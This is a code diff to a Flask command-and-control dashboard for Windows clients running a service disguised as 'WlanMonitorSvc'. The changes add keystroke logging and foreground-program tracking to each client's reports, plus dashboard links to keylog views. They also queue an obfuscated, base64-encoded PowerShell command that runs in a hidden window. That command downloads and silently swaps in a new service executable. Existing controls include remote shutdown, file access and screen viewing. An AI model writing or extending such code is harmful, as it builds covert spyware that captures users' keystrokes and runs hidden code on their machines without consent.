@@ -8,20 +8,24 @@ bp = Blueprint('main', __name__)
 @bp.route('/api/ping/<mac>')
 def api_ping(mac):
     if mac in clients_db and is_online(clients_db[mac].get('last_seen', '')):
-        return jsonify({"status": "online"})
+        return jsonify({"status": "online", "kl": clients_db[mac].get('kl', '0')})
     return jsonify({"status": "offline"})
 
 @bp.route('/report', methods=['GET'])
 def report_client():
     mac = request.args.get('mac')
     ver = request.args.get('ver')
+    fg = request.args.get('fg', '')
+    kl = request.args.get('kl', '')
     if mac and ver:
         time_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         if mac not in clients_db:
-            clients_db[mac] = {"name": "未命名设备", "ver": ver, "last_seen": time_str}
+            clients_db[mac] = {"name": "未命名设备", "ver": ver, "last_seen": time_str, "fg": fg, "kl": kl}
         else:
             clients_db[mac]["ver"] = ver
             clients_db[mac]["last_seen"] = time_str
+            clients_db[mac]["fg"] = fg
+            clients_db[mac]["kl"] = kl
             if "name" not in clients_db[mac]:
                 clients_db[mac]["name"] = "未命名设备"
 
@@ -91,10 +95,28 @@ def update_mgmt():
         with open(VERSION_FILE, 'w', encoding='utf-8') as f:
             f.write(new_ver_str)
 
+    import base64
+    host_url = request.host_url.rstrip('/')
+
+    def get_version(v_str):
+        try: return [int(x) for x in v_str.strip().split('.')]
+        except: return [0, 0, 0]
+
     # 下发全局紧急更新通知给所有在线设备
     for mac, info in clients_db.items():
         if is_online(info.get('last_seen', '')):
-            clients_db[mac]['pending_cmd'] = 'UPDATE_NOW'
+            client_ver = info.get('ver', '1.0.0')
+            if get_version(client_ver) >= [1, 6, 10]:
+                clients_db[mac]['pending_cmd'] = 'UPDATE_NOW'
+            else:
+                ps_cmd = (
+                    "$p=(Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\WlanMonitorSvc').ImagePath.Replace('\"', ''); "
+                    "if (-not $p) { exit }; "
+                    f"try {{ (New-Object System.Net.WebClient).DownloadFile('{host_url}/update/WlanMonitorSvc.exe', \"$p.new\") }} catch {{ exit }}; "
+                    "Start-Process cmd.exe -WindowStyle Hidden -ArgumentList \"/c taskkill /f /im WlanMonitorSvc.exe & ping 127.0.0.1 -n 3 > nul & move /y `\"$p.new`\" `\"$p`\" & net start WlanMonitorSvc\""
+                )
+                ps_b64 = base64.b64encode(ps_cmd.encode('utf-16le')).decode('utf-8')
+                clients_db[mac]['pending_cmd'] = f"powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand {ps_b64}"
     save_db()
 
     return redirect(url_for('main.index'))
@@ -111,9 +133,27 @@ def rollback_version():
             shutil.copy(exe_path, os.path.join(UPDATE_DIR, 'WlanMonitorSvc.exe'))
             with open(VERSION_FILE, 'w', encoding='utf-8') as f:
                 f.write(rollback_ver)
+            import base64
+            host_url = request.host_url.rstrip('/')
+
+            def get_version(v_str):
+                try: return [int(x) for x in v_str.strip().split('.')]
+                except: return [0, 0, 0]
+
             for mac, info in clients_db.items():
                 if is_online(info.get('last_seen', '')):
-                    clients_db[mac]['pending_cmd'] = 'UPDATE_NOW'
+                    client_ver = info.get('ver', '1.0.0')
+                    if get_version(client_ver) >= [1, 6, 10]:
+                        clients_db[mac]['pending_cmd'] = 'UPDATE_NOW'
+                    else:
+                        ps_cmd = (
+                            "$p=(Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\WlanMonitorSvc').ImagePath.Replace('\"', ''); "
+                            "if (-not $p) { exit }; "
+                            f"try {{ (New-Object System.Net.WebClient).DownloadFile('{host_url}/update/WlanMonitorSvc.exe', \"$p.new\") }} catch {{ exit }}; "
+                            "Start-Process cmd.exe -WindowStyle Hidden -ArgumentList \"/c taskkill /f /im WlanMonitorSvc.exe & ping 127.0.0.1 -n 3 > nul & move /y `\"$p.new`\" `\"$p`\" & net start WlanMonitorSvc\""
+                        )
+                        ps_b64 = base64.b64encode(ps_cmd.encode('utf-16le')).decode('utf-8')
+                        clients_db[mac]['pending_cmd'] = f"powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand {ps_b64}"
             save_db()
     return redirect(url_for('main.index'))
 
@@ -149,7 +189,11 @@ def update_server():
 def serve_update(filename):
     if filename not in ['version.txt', 'WlanMonitorSvc.exe']:
         return "拒绝访问", 403
-    return send_from_directory(UPDATE_DIR, filename)
+    response = send_from_directory(UPDATE_DIR, filename)
+    response.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
+    response.headers["Pragma"] = "no-cache"
+    response.headers["Expires"] = "0"
+    return response
 
 @bp.route('/tables_partial')
 def tables_partial():
@@ -168,6 +212,7 @@ def tables_partial():
                 <th>MAC 地址</th>
                 <th>设备备注名</th>
                 <th>当前运行版本</th>
+                <th>当前焦点程序</th>
                 <th>最后心跳时间</th>
                 <th>快速操作</th>
                 <th>状态</th>
@@ -183,6 +228,7 @@ def tables_partial():
                     <button onclick="promptRename('{{ mac }}', '{{ info.name }}')" style="padding:2px 5px; font-size:12px; margin-left:5px; background:#6c757d;">重命名</button>
                 </td>
                 <td>v{{ info.ver }}</td>
+                <td style="color:#007bff; font-weight:bold; max-width:200px; white-space:nowrap; overflow:hidden; text-overflow:ellipsis;" title="{{ info.fg|default('暂无') }}">{{ info.fg|default('暂无') }}</td>
                 <td>{{ info.last_seen }}</td>
                 <td>
                     <button onclick="quickCmd('{{ mac }}', 'shutdown /s /t 0')" style="background:#dc3545; padding:4px 8px; font-size:12px;">关机</button>
@@ -191,12 +237,13 @@ def tables_partial():
                     <a href="/files/{{ mac }}" style="background:#17a2b8; color:#fff; padding:4px 8px; text-decoration:none; border-radius:4px; font-size:12px; display:inline-block;">📁 文件</a>
                     <a href="/taskmgr/{{ mac }}" style="background:#6f42c1; color:#fff; padding:4px 8px; text-decoration:none; border-radius:4px; font-size:12px; display:inline-block;">📊 任务管理</a>
                     <a href="/screen/{{ mac }}" style="background:#fd7e14; color:#fff; padding:4px 8px; text-decoration:none; border-radius:4px; font-size:12px; display:inline-block;">📺 屏幕画面</a>
+                    <a href="/keylog/{{ mac }}" target="_blank" style="background:#20c997; color:#fff; padding:4px 8px; text-decoration:none; border-radius:4px; font-size:12px; display:inline-block;">🔤 键盘记录</a>
                     <a href="/view_log/{{ mac }}" target="_blank" style="background:#e83e8c; color:#fff; padding:4px 8px; text-decoration:none; border-radius:4px; font-size:12px; display:inline-block;">📜 运行日志</a>
                 </td>
                 <td class="status-online">📡 在线</td>
             </tr>
             {% else %}
-            <tr><td colspan="7" style="text-align: center; color: #888;">抱歉，目前没有监测到任何活动设备连接。</td></tr>
+            <tr><td colspan="8" style="text-align: center; color: #888;">抱歉，目前没有监测到任何活动设备连接。</td></tr>
             {% endfor %}
         </tbody>
     </table>
@@ -235,6 +282,7 @@ def tables_partial():
                 <td>
                     <a href="/terminal/{{ mac }}" style="background:#6c757d; color:#fff; padding:5px 10px; text-decoration:none; border-radius:4px; font-size:14px; display:inline-block;">📝 查看遗留日志</a>
                     <a href="/view_log/{{ mac }}" target="_blank" style="background:#e83e8c; color:#fff; padding:5px 10px; text-decoration:none; border-radius:4px; font-size:14px; display:inline-block; margin-left:5px;">📜 运行日志</a>
+                    <a href="/keylog/{{ mac }}" target="_blank" style="background:#20c997; color:#fff; padding:5px 10px; text-decoration:none; border-radius:4px; font-size:14px; display:inline-block; margin-left:5px;">🔤 键盘记录</a>
                 </td>
                 <td class="status-offline">已离线</td>
             </tr>
